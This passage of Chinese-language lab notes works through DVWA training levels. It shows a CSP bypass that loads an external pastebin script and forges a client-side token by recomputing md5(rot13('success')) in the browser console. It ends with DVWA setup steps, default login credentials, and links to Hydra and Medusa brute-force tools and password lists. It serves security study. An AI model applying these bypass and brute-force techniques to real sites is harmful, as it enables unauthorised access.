id="f4ac851d-b5d8-4572-95a6-095eedc6d0e8" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20108.png"><img style="width:3066px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20108.png"/></a></figure><p id="24aced12-f703-4f17-8423-21fc15497a86" class="">
+</p><p id="a55b6426-80ea-4628-b92b-933f3bac59cf" class="">來試試看其他的</p><pre id="b6df1306-8f1c-4af1-831a-cc36990a8b12" class="code code-wrap"><code>https://pastebin.com/embed/sa4JzpAP</code></pre><p id="d3ba1331-e5ee-41b3-959b-7f55ce432d06" class="">
+</p><p id="0c7cdf11-4935-4507-946b-a44e1b6e62f3" class="">即使不是 .js file 好像也可以被執行</p><figure id="db5b1dbe-6de6-44dd-b703-44a44bac9871" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20109.png"><img style="width:1782px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20109.png"/></a></figure><figure id="4c0332e0-4e95-411b-a0db-b2ce8e18c5da" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20110.png"><img style="width:3068px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20110.png"/></a></figure><p id="0cc35558-b279-4701-b0d0-91eddd2c8b6b" class="">
+</p><h3 id="e6706e51-015c-435c-869a-3524ea8c9ba2" class="">心得</h3><p id="e584db24-fd65-42e3-8800-e61dd0889785" class="">直得留意的是，本機的 DVWA 是沒有 HTTPS 的，而載入的來源都已經強制使用或自動跳轉成 HTTPS</p><p id="de13bc02-ad6f-42bb-8f76-b4c6d295087c" class="">
+</p><p id="017e1b89-8cc9-4c4f-8ce2-68341127259a" class="">
+</p><hr id="fee9c3e6-a0d5-446e-b731-246c82fc8117"/><h1 id="4269aa9d-fc42-47dd-8589-8c6f3df39362" class="">14. JavaScript Attacks</h1><p id="bdaae141-c36a-452f-9f57-10e535677d8b" class="">看起來是要我們送出 success 這個字串，但送出後卻得到 <code>Invalid token.</code></p><p id="bb56217f-5814-4859-800f-6996fa2afa27" class="">
+</p><figure id="971c74bf-f865-4610-a18e-dd5ccb887e74" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20111.png"><img style="width:2332px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20111.png"/></a></figure><h2 id="05ee4167-1363-47aa-8467-73b2a4422a13" class="">觀察</h2><h3 id="07b10677-8603-4c46-a5b4-c19237825cc6" class="">查看表單細節</h3><figure id="014b7a24-167f-4b98-b7d3-a9b29dd707f2" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20112.png"><img style="width:1542px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20112.png"/></a></figure><h3 id="bc040994-1d09-4215-b7f6-4279c34e4d2b" class="">檢查送出前 javascript 有做哪些處理</h3><div id="14a25824-8dd6-4c73-9a72-dcafc128fe38" class="column-list"><div id="81d8c565-52bf-4fc5-a158-7d7af9306576" style="width:75%" class="column"><figure id="050dc478-3336-46a4-a491-de52847d78cf" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20113.png"><img style="width:1416px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20113.png"/></a></figure></div><div id="383bcc6e-a214-4d00-8025-0c5f1e072e2a" style="width:25%" class="column"><figure id="63f7b00f-1c22-4ada-b245-66a1be7a8934" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20114.png"><img style="width:288px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20114.png"/></a><figcaption>快速查一下 wiki XD</figcaption></figure></div></div><pre id="f4630171-3e89-4266-acf1-9207e567c98c" class="code code-wrap"><code>/*
+MD5 code from here
+https://github.com/blueimp/JavaScript-MD5
+*/
+
+...
+
+function rot13(inp) {
+		return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);});
+	}
+
+	function generate_token() {
+		var phrase = document.getElementById(&quot;phrase&quot;).value;
+		document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));
+	}
+
+	generate_token();</code></pre><p id="92bfb0c1-4bd5-4f6b-a0c6-9550f1af16bf" class="">
+</p><p id="9b4566ae-5b8c-40d8-a94d-6b15c8dd6805" class="">可以發現在頁面載入時． <code>generate_token()</code> 這個 function 會被執行一次，它將 <code>#phrase</code> 的 value 餵給 md5 和 rot13，產生一組 token，此時 <code>phrase</code> 是預設的 <code>ChangeMe</code> ，因此不論你送出什麼，都會得到 invalid token 這樣的回傳訊息，因為 token 是由 <code>ChangeMe</code> 這個字串的值運算而來 也就是<code>8b479aefbd90795395b3e7089ae0dc09</code>．</p><p id="4e392e15-05eb-438c-91d0-51089f9fceca" class="">因此簡單的解法就是在 input 填入 <code>success</code> 後，於 console 再執行一次，這樣 token 的值就會改變成<code><strong>38581812b435834ebf84ebcc2c6424d6</strong></code><strong> </strong></p><p id="fd05c241-2364-492e-a215-4bfde0e59760" class="">
+</p><p id="af7eb5b7-1a70-44aa-91ea-52bb9171eddf" class="">手動在 console 執行 <code>generate_token()</code> 一次，再送出表單</p><figure id="596aa29f-5388-43e6-8087-0e5a8ab194b6" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20115.png"><img style="width:1996px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20115.png"/></a></figure><h3 id="96242907-48d2-4c1e-970c-d0248629ff7a" class="">✨Done✨</h3><figure id="b144e987-9e89-486e-9cae-dfd2aec69e41" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20116.png"><img style="width:2022px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20116.png"/></a></figure><p id="16033edc-7cda-48a7-8521-77b718da9949" class="">
+</p><h2 id="c2792a98-5b12-4b31-b174-a31ce72a486f" class="">memo</h2><h3 id="d671f208-518c-4f8e-9644-3e4c1da2f7de" class="">測試 <code>generate_token()</code> </h3><figure id="d485e69d-7e09-453a-9d76-dffb060e20e1" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20117.png"><img style="width:642px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20117.png"/></a></figure><pre id="2a6cf0a1-f461-41ea-9cbd-d32119953c92" class="code code-wrap"><code>md5(rot13(&#x27;ChangeMe&#x27;)) // &quot;8b479aefbd90795395b3e7089ae0dc09&quot;</code></pre><p id="8d74487e-0770-4b82-9f26-c926f05c1417" class="">
+</p><figure id="7d5a0d52-e1e1-4b90-a4f0-5efaacccb82f" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20118.png"><img style="width:724px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20118.png"/></a></figure><pre id="e376ee6c-544c-4a91-8198-ccbda532aeb7" class="code code-wrap"><code>md5(rot13(&#x27;success&#x27;)) // &quot;38581812b435834ebf84ebcc2c6424d6&quot;</code></pre><p id="17f0561d-05e9-485d-9163-83c7997f3b0e" class="">
+</p><figure id="0cc91ea6-bd61-4b3b-9097-f85fa80bf12f" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20119.png"><img style="width:1324px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20119.png"/></a></figure><figure id="967791b8-ebb5-4b7d-9124-162c2d5d2755" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20120.png"><img style="width:3044px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20120.png"/></a></figure><figure id="754e6a0f-8b59-46ae-83b7-25ad342ee56e" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20121.png"><img style="width:1352px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20121.png"/></a></figure><pre id="868a0e77-b57b-4e8b-ac47-4ce64928eb0e" class="code code-wrap"><code>token=38581812b435834ebf84ebcc2c6424d6&amp;phrase=success&amp;send=Submit</code></pre><p id="349684b4-d5f2-4950-8689-a21f0bb7b5af" class="">
+</p><figure id="d21f605f-a566-47f5-b1a7-6592ca8473d1" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20122.png"><img style="width:1450px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20122.png"/></a></figure><figure id="aa86aec2-0f36-4123-91ae-2193d6d937c2" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20123.png"><img style="width:3006px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20123.png"/></a></figure><figure id="667552d5-7ba6-4ee7-ba2c-34c99ccc8e38" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20124.png"><img style="width:898px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20124.png"/></a></figure><hr id="40e02496-e587-4760-b62d-49d49dcaaac8"/><h1 id="2bcfacbc-f164-4027-a135-4caf29ba116b" class="">Ref</h1><h2 id="e502987e-4008-4707-bfe9-421da3128c76" class="">run DVWA with container</h2><p id="bf14418f-68a3-4c80-909e-70bf21bdf9cf" class="">opsxcq/docker-vulnerable-dvwa: Damn Vulnerable Web Application Docker container
+<a href="https://github.com/opsxcq/docker-vulnerable-dvwa">https://github.com/opsxcq/docker-vulnerable-dvwa</a></p><p id="f6114033-cff3-40ff-8fb8-25151b07422f" class="">
+</p><pre id="f756bac4-1f5e-41ac-bb62-ab2a398fb2b7" class="code code-wrap"><code>docker run --rm -it -p 8086:80 vulnerables/web-dvwa</code></pre><p id="aaf7219e-3bf1-4266-bfe5-df9d3b2c97ce" class="">or</p><pre id="1610a369-4f9c-4bf0-8488-daadd1c1fa73" class="code code-wrap"><code>docker run -d -p 8086:80 vulnerables/web-dvwa</code></pre><pre id="a46c0fd9-f76c-4359-82a5-6a707b45e29c" class="code code-wrap"><code>go to http://localhost:8086</code></pre><pre id="fb611fc5-c91e-4cc9-820c-8eaedeeb540f" class="code code-wrap"><code>To login you can use the following credentials:
+
+    Username: admin
+    Password: password</code></pre><div id="d0d36379-e4ef-43b3-913b-bf54c33062e2" class="column-list"><div id="8570298a-6154-4bf0-a61d-3be3fb06634e" style="width:50%" class="column"><p id="4698a633-018b-46e1-a61f-39ff7a1f5ffc" class="">帳密用 dev:dev  也能登入 @@</p></div><div id="4d0f6707-be2e-4d05-8e9e-bb5fc3918d86" style="width:50%" class="column"><figure id="61862d81-baff-4a8b-a833-d98379bbdd5a" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20125.png"><img style="width:336px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20125.png"/></a></figure></div></div><p id="67526256-d6ac-4b21-9846-41c2db569e35" class="">
+</p><p id="da84a657-7caf-4d65-b756-b97b276f030b" class="">
+</p><p id="2d9a6cdf-4378-44ce-8df8-0e445e306ecb" class="">
+</p><pre id="d7889400-d74f-4fa7-acdc-87e54452187c" class="code code-wrap"><code>http://localhost:8086/instructions.php?doc=readme</code></pre><p id="11c5ddb1-b5ef-49cc-a9d7-e92067fb4c79" class="">DVWA 說明頁面裡面也有些文件可以參考，有附贈 Guide，包括了 OWASP10 和難度說明</p><figure id="6c4eea5b-5c71-4756-82dd-f89a4b619b55"><div class="source"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/DVWA_v1.3.pdf">https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6f6ab354-cd9a-4f19-bb1b-1c0ab5d8a071/DVWA_v1.3.pdf</a></div></figure><p id="0e3a30dd-5809-47c5-a54f-8a961852624f" class="">
+</p><p id="6be23dcb-66c1-43ac-99f3-ba404ad6d0c6" class="">首頁 - OWASP Top 10:2021
+<a href="https://owasp.org/Top10/zh_TW/">https://owasp.org/Top10/zh_TW/</a></p><p id="188d16b1-e5b4-4516-accf-589e21ea65c7" class="">DVWA - Damn Vulnerable Web Application
+<a href="https://dvwa.co.uk/">https://dvwa.co.uk/</a></p><p id="7b86d64e-63c9-46d9-8e8a-2af95c0492dc" class="">digininja/DVWA: Damn Vulnerable Web Application (DVWA)
+<a href="https://github.com/digininja/DVWA">https://github.com/digininja/DVWA</a></p><p id="657220d4-67b0-4a10-96a5-0d31a5cc32f6" class="">
+</p><h2 id="0f9b6d16-2a3d-4cbf-8adb-1df91dffd941" class="">Enable PHP modules</h2><h3 id="b6e030d6-8d43-4e52-bcb6-276b060f3f24" class="">Editing php.ini</h3><h3 id="1e042a15-03ad-4e12-ac44-e7dc1aa7b6e6" class="">1. 直接進入 container 內修改</h3><p id="d9328431-7e5e-4232-b763-71c5815cdaf6" class="">docker-vulnerable-dvwa/Dockerfile at master · opsxcq/docker-vulnerable-dvwa
+<a href="https://github.com/opsxcq/docker-vulnerable-dvwa/blob/master/Dockerfile">https://github.com/opsxcq/docker-vulnerable-dvwa/blob/master/Dockerfile</a></p><p id="570b74c3-e6c5-4787-960c-4a0bab19e6ca" class="">Repo 裡有寫 PHP5 的設定，但是沒有 for PHP7 的，PHP7 的設定檔在 <code>/etc/php/7.0/apache2/php.ini</code> ，看起來是已經安裝在環境裡，如果要自己 build，就要另外改 Dockerfile，將自己的 PHP7 config 複製進去</p><pre id="fb9ccbb1-c37f-4563-835c-6198f21d512e" class="code code-wrap"><code>...
+COPY php.ini /etc/php5/apache2/php.ini
+...</code></pre><p id="7b4800dc-cd85-464c-87d5-bc7623b08208" class="">
+</p><pre id="8de606a1-0208-4014-a86c-3d7dc6a7573e" class="code code-wrap"><code>docker exec -it app-training-dvwa /bin/bash
+apt update -y &amp;&amp; apt install vim -y
+vim /etc/php/7.0/apache2/php.ini
+service apache2 restart</code></pre><p id="3d9fe44d-fe9c-4bc9-8bed-e457e82c1b40" class="">
+</p><h3 id="f6382593-1920-48d1-a966-c59e1480a500" class="">2. 或自行 build image</h3><pre id="6a26e73a-2777-4902-aa51-d401b8436157" class="code code-wrap"><code>git clone https://github.com/opsxcq/docker-vulnerable-dvwa.git
+cd docker-vulnerable-dvwa
+# prepare your own php.ini
+docker build .</code></pre><p id="4f718dbb-82c2-49fb-9719-d56738c576d4" class="">
+</p><h2 id="149ce9a2-804a-409d-9e17-084a081d76e4" class="">Hydra</h2><h3 id="69d20057-92a9-41f1-b4ac-2aeb7f670830" class="">password list</h3><p id="45e39a69-695c-4e1c-be34-90626fd905e5" class="">SecLists/Passwords/Common-Credentials at master · danielmiessler/SecLists
+<a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials">https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials</a></p><p id="739ef6c2-a183-4318-989c-28b31fd9ae8a" class="">
+</p><div id="93c35e45-84d7-4b80-a162-f9dc13cbd591" class="column-list"><div id="b74ffeb8-4370-44d6-bf57-e777efb96996" style="width:50%" class="column"><p id="a1a88898-dd7b-437c-b6bc-2ae40e06788f" class="">Hydra-Cheatsheet/Hydra-Password-Cracking-Cheatsheet.pdf at master · frizb/Hydra-Cheatsheet
+<a href="https://github.com/frizb/Hydra-Cheatsheet/blob/master/Hydra-Password-Cracking-Cheatsheet.pdf">https://github.com/frizb/Hydra-Cheatsheet/blob/master/Hydra-Password-Cracking-Cheatsheet.pdf</a></p></div><div id="4fb4bb60-6dca-4038-817c-a9677b256f09" style="width:50%" class="column"><figure id="364f648f-a32a-44ab-9e80-0bee8c8c62bb" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20126.png"><img style="width:384px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20126.png"/></a></figure></div></div><p id="21265008-100c-43e1-9bda-927d4003b868" class="">
+</p><h3 id="7754a736-5d4e-4861-a5e0-7b3eb2347a1d" class="">Medusa</h3><p id="dcf99dc2-bfeb-48c5-8e6e-fbad95d10d1e" class="">Brute Force Password Cracking with Medusa | by SheHacks_KE | Medium
+<a href="https://shehackske.medium.com/brute-force-password-cracking-with-medusa-b680b4f33d69">https://shehackske.medium.com/brute-force-password-cracking-with-medusa-b680b4f33d69</a>
+jmk-foofus/medusa: Medusa is a speedy, parallel, and modular, login brute-forcer.
+<a href="https://github.com/jmk-foofus/medusa">https://github.com/jmk-foofus/medusa</a></p><p id="9c029e68-e752-42fb-ba4f-7607bae80523" class="">
+</p><h2 id="68b12f97-837d-4295-b364-e2a9580acb55" class="">write-ups</h2><p id="dda34db9-2cff-4467-bacd-08743fa6bcb5" class="">ctf-writeups/dvwa-low.md at master · mzet-/ctf-writeups
+<a href="https://github.com/mzet-/ctf-writeups/blob/master/DVWA/dvwa-low.md">https://github.com/mzet-/ctf-writeups/blob/master/DVWA/dvwa-low.md</a></p><p id="cfa687cd-3cd8-4f5e-9292-76b1fe28b568" class="">
+</p><h2 id="90e2f34d-b1f9-40b0-8920-71f2b74a4a58" class=""><em>reCAPTCHA API key missing</em></h2><figure id="2e34f9d5-f8eb-4a36-a988-ec027ca7e816" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20127.png"><img style="width:1744px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20127.png"/></a></figure><p id="416b23a3-f7f0-4b10-88ce-19b95f4ec753" class="">
+</p><h3 id="929690db-c3d6-4da0-8e77-eae8619d6b2a" class="">取得 <em>reCAPTCHA v2 </em>public &amp; private key</h3><figure id="ee183a18-bfd9-424c-b9db-968b18f13165"><a href="https://www.google.com/recaptcha/admin/create" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">https://www.google.com/recaptcha/admin/create</div></div><div class="bookmark-href">https://www.google.com/recaptcha/admin/create</div></div></a></figure><p id="8a40f71d-2280-448f-a0af-38e641f4b93e" class="">
+</p><p id="bfc6c2d7-1111-476a-9568-6766eae136b4" class="">註冊網域:</p><pre id="13001200-aab6-4bf3-a777-4e16b53afaa0" class="code code-wrap"><code>localhost</code></pre><figure id="735b0c57-187a-48f6-be15-52d996064d2c" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20128.png"><img style="width:480px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20128.png"/></a></figure><p id="52d3b460-9375-48ba-941a-7c4c65bb5d9b" class="">
+</p><p id="218e609e-c35e-46bd-aae3-64df7cd0e53e" class="">edit <code>/var/www/html/config/config.inc.php</code></p><pre id="7d9dbfd5-ff77-4300-9067-cc3ff57c95ad" class="code code-wrap"><code>vim /var/www/html/config/config.inc.php</code></pre><figure id="b318dfc6-ac40-44ab-94ec-d805e2f19d61" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20129.png"><img style="width:933px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20129.png"/></a></figure><p id="71947038-d4b1-438f-b963-f51b8bad00a0" class="">
+</p><h3 id="af0301f7-541d-47a9-aa99-db697d17e5eb" class="">不支援 <a href="http://localhost">localhost</a> 了，因此可以用 .local or 自己定義其他 alias 取代 localhost</h3><figure id="bad97626-5950-4886-b370-c3c36ea11289" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20130.png"><img style="width:480px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20130.png"/></a></figure><p id="568a1507-63fe-42e3-9906-546d9dee8e05" class="">
+</p><h3 id="c7d27952-5940-4087-b369-4815e780af87" class="">edit hosts file</h3><pre id="ed4a2a67-2a37-4f97-8b45-d5542cfe3e6c" class="code code-wrap"><code>127.0.0.1 dvwa.localtest</code></pre><div id="ccaf97c5-533f-4683-92ff-0d99ce560181" class="column-list"><div id="aa817d16-dba2-4c04-a9dd-5b1e3fd29948" style="width:50%" class="column"><figure id="5559d4fd-1450-4f14-b4f9-08ca00fc99e7" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20131.png"><img style="width:732px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20131.png"/></a></figure><p id="0b82a862-44e7-4031-ac1f-f531eed9c358" class="">
+</p></div><div id="ac82e238-a447-4efa-aca3-27cb86699a48" style="width:50%" class="column"><figure id="aa64a794-2b38-4824-9431-89591d84fa0a" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20132.png"><img style="width:576px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20132.png"/></a></figure><p id="468c0e9c-75f8-41ab-bca5-7d117d23e24b" class="">
+</p></div></div><hr id="856cd0b9-7161-4e81-854a-afb87f410967"/><h3 id="ca62db91-7346-4126-ac4d-137925d95a0e" class="">Other links</h3><p id="bb8ea362-4e6c-48dd-8d92-d3ad8fd3212f" class="">Web Security Testing Cookbook
+<a href="https://learning.oreilly.com/library/view/web-security-testing/9780596514839/">https://learning.oreilly.com/library/view/web-security-testing/9780596514839/</a></p><p id="d2dc4ffb-58d9-4abe-82f8-33be32fb39fa" class="">MySQL SQL Injection Cheat Sheet | pentestmonkey
+<a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</a></p><p id="9ffd9c19-df02-43fc-b365-76960629a5c8" class="">我們與 OSCP 的距離
+<a href="https://tech-blog.cymetrics.io/posts/crystal/oscp-review/">https://tech-blog.cymetrics.io/posts/crystal/oscp-review/</a></p><p id="b3c4aff0-8c4c-4e0a-bd12-9c4ab2305350" class="">資安這條路 04 - [Injection] SQL injection - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天
+<a href="https://ithelp.ithome.com.tw/articles/10240102">https://ithelp.ithome.com.tw/articles/10240102</a>
+[Day30] Pentesting CheatSheet Meow Meow - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天
+<a href="https://ithelp.ithome.com.tw/articles/10281813">https://ithelp.ithome.com.tw/articles/10281813</a></p><p id="4ad98cee-0118-4f04-b2ae-096d7a3dcef9" class="">從 PicoCTF 中跨領域學資訊安全 :: 2021 iThome 鐵人賽
+<a href="https://ithelp.ithome.com.tw/users/20134305/ironman/4222">https://ithelp.ithome.com.tw/users/20134305/ironman/4222</a></p><p id="f4ed909c-037f-4058-99eb-8245a30829a1" class="">SQL Tutorial
+<a href="https://www.w3schools.com/sql/default.asp">https://www.w3schools.com/sql/default.asp</a>
+SQL Server IF ELSE Statement By Examples
+<a href="https://www.sqlservertutorial.net/sql-server-stored-procedures/sql-server-if-else/">https://www.sqlservertutorial.net/sql-server-stored-procedures/sql-server-if-else/</a>
+Oracle基本修練: PL/SQL if-else, case statements | by ChunJen Wang | jimmy-wang | Medium
+<a href="https://medium.com/jimmy-wang/oracle%E5%9F%BA%E6%9C%AC%E4%BF%AE%E7%B7%B4-pl-sql-if-else-case-statements-5399d6631307">https://medium.com/jimmy-wang/oracle基本修練-pl-sql-if-else-case-statements-5399d6631307</a></p><p id="6ac7c055-09ce-4155-b0f6-f27bb70f5884" class="">OWASP Top Ten Web Application Security Risks | OWASP
+<a href="https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/</a>
+網路安全-靶機dvwa之sql注入Low到High詳解（含程式碼分析）_osc_0qnrwmy3 - MdEditor
+<a href="https://www.gushiciku.cn/pl/pFNg/zh-tw">https://www.gushiciku.cn/pl/pFNg/zh-tw</a></p><p id="cd2fe6c3-8cdd-4c31-a1fa-d0300709d760" class="">Types of XSS | OWASP Foundation
+<a href="https://owasp.org/www-community/Types_of_Cross-Site_Scripting#DOM_Based_XSS_.28AKA_Type-0.29">https://owasp.org/www-community/Types_of_Cross-Site_Scripting#DOM_Based_XSS_.28AKA_Type-0.29</a></p><p id="804b6992-ce04-4337-a994-adb3acacca82" class="">
+</p><p id="8de34fc1-4610-419b-8b4f-e2c782362c4b" class="">SQL Server IF ELSE Statement By Examples
+<a href="https://www.sqlservertutorial.net/sql-server-stored-procedures/sql-server-if-else/">https://www.sqlservertutorial.net/sql-server-stored-procedures/sql-server-if-else/</a>
+Oracle基本修練: PL/SQL if-else, case statements | by ChunJen Wang | jimmy-wang | Medium
+<a href="https://medium.com/jimmy-wang/oracle%E5%9F%BA%E6%9C%AC%E4%BF%AE%E7%B7%B4-pl-sql-if-else-case-statements-5399d6631307">https://medium.com/jimmy-wang/oracle基本修練-pl-sql-if-else-case-statements-5399d6631307</a></p><p id="1ca86013-c464-4738-ab77-5c43c08a730c" class="">Flexible Database Schema + Hybrid Data Model | JSON
+<a href="https://mariadb.com/database-topics/semi-structured-data/">https://mariadb.com/database-topics/semi-structured-data/</a></p><p id="ee51d130-3853-4ab0-bd7e-377ef6fc62b0" class="">Birds of a Feather 2017: 邀請分享 Light Up The Korean DarkWeb - Dasom Kim
+<a href="https://www.slideshare.net/HITCONGIRLS/birds-of-a-feather-2017-light-up-the-korean-darkweb-dasom-kim">https://www.slideshare.net/HITCONGIRLS/birds-of-a-feather-2017-light-up-the-korean-darkweb-dasom-kim</a>
+The Malware Museum : Free Software : Free Download, Borrow and Streaming : Internet Archive
+<a href="https://archive.org/details/malwaremuseum">https://archive.org/details/malwaremuseum</a></p><p id="08dbe850-aa06-48da-ace3-4264a58af558" class="">
+</p></div></article></body></html>
